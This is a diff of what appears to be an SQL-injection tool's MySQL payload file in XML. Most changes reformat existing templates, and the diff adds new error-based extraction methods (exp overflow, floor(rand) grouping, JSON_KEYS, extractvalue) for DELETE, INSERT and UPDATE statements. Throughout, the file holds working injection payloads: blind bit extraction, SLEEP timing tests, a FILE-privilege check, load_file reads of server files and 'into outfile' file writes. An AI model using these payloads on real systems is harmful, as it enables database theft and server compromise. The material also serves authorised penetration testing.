@@ -38,7 +38,7 @@ select concat(
     on s.SCHEMA_NAME = t.table_schema
     group by r
     {limit}
-)x
+) x
             </database>
             <table>
 select concat(
@@ -60,7 +60,7 @@ select concat(
     where TABLE_SCHEMA = 0x${DATABASE.HEX}
     order by r
     {limit}
-)x
+) x
             </table>
             <column>
 select concat(
@@ -81,7 +81,7 @@ select concat(
     and TABLE_NAME = 0x${TABLE.HEX}
     order by n
     {limit}
-)x
+) x
             </column>
             <row>
                 <query>
@@ -103,7 +103,7 @@ select concat(
     from `${DATABASE}`.`${TABLE}`
     group by r
     {limit}
-)x
+) x
                 </query>
                 <fields>
                     <field>trim(ifnull(`${FIELD}`, 0x00))</field>
@@ -116,17 +116,17 @@ select concat(
 cast(
     concat(
         (
-            select if(count(*)=1,0x74727565,0x66616c7365)
+            select if(count(*) = 1, 0x74727565, 0x66616c7365)
             from INFORMATION_SCHEMA.USER_PRIVILEGES
-            where grantee=concat(0x27,replace(cast(current_user as char),0x40,0x274027),0x27)
-            and PRIVILEGE_TYPE=0x46494c45
-        )
-        ,
+            where grantee = concat(0x27, replace(cast(current_user as char), 0x40, 0x274027), 0x27)
+            and PRIVILEGE_TYPE = 0x46494c45
+        ),
         ${TRAIL_HEX}
     )
-as char)
+    as char
+)
             </privilege>
-            <read>cast(concat(load_file(0x${FILEPATH.HEX}),${TRAIL_HEX})as char)</read>
+            <read>cast(concat(load_file(0x${FILEPATH.HEX}), ${TRAIL_HEX}) as char)</read>
             <create>
                 <content>(select 0x${CONTENT.HEX})</content>
                 <query>into outfile "${FILEPATH}"</query>
@@ -155,38 +155,62 @@ as char)
         </configuration>
         <normal>
             <indices>union select ${INDICES}</indices>
-            <capacity>(select concat(${LEAD_HEX}, ${INDICE}, ${CALIBRATOR}))</capacity>
+            <capacity>
+(
+    select concat(
+        ${LEAD_HEX}, 
+        ${INDICE}, 
+        ${CALIBRATOR}
+    )
+)
+            </capacity>
             <orderBy>order by 1337</orderBy>
         </normal>
         <boolean>
             <test>
                 <false>true = false</false>
-                <false>true%21 = true</false>
-                <false>false%21 = false</false>
+                <false>true %21= true</false>
+                <false>false %21= false</false>
                 <false>1 = 2</false>
-                <false>1%21 = 1</false>
-                <false>2%21 = 2</false>
+                <false>1 %21= 1</false>
+                <false>2 %21= 2</false>
                 <true>true = true</true>
                 <true>false = false</true>
-                <true>true%21 = false</true>
+                <true>true %21= false</true>
                 <true>1 = 1</true>
                 <true>2 = 2</true>
-                <true>1%21 = 2</true>
+                <true>1 %21= 2</true>
                 <initialization>0%2b1 = 1</initialization>
-                <bit>ascii(substring(${INJECTION}, ${INDEX}, 1))%26${BIT}</bit>
+                <bit>
+ascii(
+    substring(
+        ${INJECTION}, 
+        ${INDEX}, 
+        1
+    )
+) 
+%26 ${BIT}
+                </bit>
                 <length>char_length(${INJECTION}) > ${INDEX}</length>
             </test>
             <blind>and ${TEST}</blind>
-            <time>and if(${TEST}, 1, SLEEP(${SLEEP_TIME}))</time>
+            <time>
+and if(
+    ${TEST}, 
+    1, 
+    SLEEP(${SLEEP_TIME})
+)
+            </time>
         </boolean>
         <error>
             <method>
                 <name>BIGINT::exp</name>
                 <query>
 and !(
-    select * from (
+    select * 
+    from (
         ${WINDOW}
-    )x
+    ) x
 )-~0
                 </query>
                 <capacity>64</capacity>
@@ -198,12 +222,27 @@ and !(
     select 1 
     from (
         select !(
-            select * from (
+            select * 
+            from (
                 ${WINDOW}
-            )x
+            ) x
         )-~0
-    )x
+    ) x
 )
+                </query>
+                <capacity>64</capacity>
+            </method>
+            <method>
+                <name>BIGINT::exp in Delete Update Insert</name>
+                <query>
+' or (
+    select !(
+        select * 
+        from (
+            ${WINDOW}
+        ) x
+    )-~0
+) or '
                 </query>
                 <capacity>64</capacity>
             </method>
@@ -212,9 +251,10 @@ and !(
                 <query>
 and 1 = exp(
     ~(
-        select * from (
+        select * 
+        from (
             ${WINDOW}
-        )x
+        ) x
     )
 )
                 </query>
@@ -226,12 +266,29 @@ and 1 = exp(
 1, (
     select exp(
         ~(
-            select * from (
+            select * 
+            from (
                 ${WINDOW}
-            )x
+            ) x
         )
     )
 )
+                </query>
+                <capacity>64</capacity>
+            </method>
+            <method>
+                <name>DOUBLE::exp in Delete Update Insert</name>
+                <query>
+' or (
+    select exp(
+        ~(
+            select * 
+            from (
+                ${WINDOW}
+            ) x
+        )
+    )
+) or '
                 </query>
                 <capacity>64</capacity>
             </method>
@@ -254,16 +311,36 @@ or exists(
             <method>
                 <name>GROUPBY::floor_rand in Order By</name>
                 <query>
-1, (select 1 from (
-    select
-        count(*),
-        concat(
-            (${WINDOW}),
-            floor(rand(0)*2)
-        )
-    from information_schema.tables
-    group by 2
-)x)
+1, (
+    select 1 from (
+        select
+            count(*),
+            concat(
+                (${WINDOW}),
+                floor(rand(0)*2)
+            )
+        from information_schema.tables
+        group by 2
+    ) x
+)
+                </query>
+                <capacity>64</capacity>
+            </method>
+            <method>
+                <name>GROUPBY::floor_rand in Delete Insert Update</name>
+                <query>
+' or (
+    select 1 from (
+        select
+            count(*),
+            concat(
+                (${WINDOW}),
+                floor(rand(0)*2)
+            )
+        from information_schema.tables
+        group by 2
+    ) x
+) or '
                 </query>
                 <capacity>64</capacity>
             </method>
@@ -271,13 +348,14 @@ or exists(
                 <name>JSON::json_keys</name>
                 <query>
 /* Require FALSE statement, then OR */
-and 1=0 or 1 = (
+and 1 = 0 or 1 = (
     select JSON_KEYS (
-        cast ((
-            select * from (
+        (
+            select * 
+            from (
                 ${WINDOW}
-            )x
-        ) as char)
+            ) x
+        )
     )
 )
                 </query>
@@ -288,14 +366,31 @@ and 1=0 or 1 = (
                 <query>
 /* Require FALSE statement, then OR */
 1, (
-    select JSON_KEYS(
-        cast((
-            select * from (
+    select JSON_KEYS (
+        (
+            select * 
+            from (
                 ${WINDOW}
-            )x
-        )as char)
+            ) x
+        )
     )
 )
+                </query>
+                <capacity>64</capacity>
+            </method>
+            <method>
+                <name>JSON::json_keys in Delete Insert Update</name>
+                <query>
+' or (
+    select JSON_KEYS (
+        (
+            select * 
+            from (
+                ${WINDOW}
+            ) x
+        )
+    )
+) or '
                 </query>
                 <capacity>64</capacity>
             </method>
@@ -324,8 +419,25 @@ and 1 = extractvalue(
                 (${WINDOW})
             )
         )
-    )x
+    ) x
 )
+                </query>
+                <capacity>99</capacity>
+            </method>
+            <method>
+                <name>XML::extractvalue in Delete Insert Update</name>
+                <query>
+' or (
+    select 1 from (
+        select extractvalue(
+            0x0a, 
+            concat(
+                0x0a, 
+                (${WINDOW})
+            )
+        )
+    ) x
+) or '
                 </query>
                 <capacity>99</capacity>
             </method>
